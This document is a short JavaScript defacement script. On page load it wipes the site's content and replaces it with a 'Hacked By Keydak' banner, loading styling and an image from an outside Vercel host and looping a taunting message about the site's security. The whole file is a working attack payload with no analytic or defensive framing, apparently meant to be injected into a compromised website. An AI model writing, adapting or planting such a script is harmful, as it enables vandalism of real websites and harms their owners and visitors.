// Deface script
document.addEventListener('DOMContentLoaded', function () {

    document.documentElement.innerHTML = '';


    var newHtmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Home - Hacked By Keydak</title>
            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
        </head>
        <body>
            <div class="mainContainer">
                <div class="img">
                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
                </div>
                <h1> Hacked By Keydak</h1>
                <hr class="hr">
                <div class="container">
                    <p class="text1"></p>
                </div>
            </div>
        </body>
              <script>
              // Function to handle the typing animation
                function startTypingAnimation() {
                    var text = "you need to improve the security system on your site";
                    var textElement = document.querySelector('.text1');

                    // Calculate animation duration based on text length
                    var animationDuration = text.length * 150; // Adjust as needed

                    // Start typing animation
                    textElement.style.animationDuration = animationDuration + 'ms';
                    textElement.classList.add('typing');

                    // After animation ends, fade out and restart animation
                    textElement.addEventListener('animationend', function() {
                        textElement.classList.remove('typing');
                        setTimeout(function() {
                            textElement.classList.add('typing');
                        }, 1000); // Wait before restarting animation
                    });
                }

                startTypingAnimation(); // Call the function to start the animation
            </script>
        </html>
    `;


    // document.addEventListener('DOMContentLoaded', function() {
    //     var text = "you need to improve the security system on your site";
    //     var textElement = document.querySelector('.text1');
    //     var index = 0;

    //     function type() {
    //         if (index < text.length) {
    //             textElement.textContent += text.charAt(index);
    //             index++;
    //             setTimeout(type, 150);
    //         }
    //     }

    //     type();
    // });
    var fragment = document.createRange().createContextualFragment(newHtmlContent);
    document.body.appendChild(fragment);
});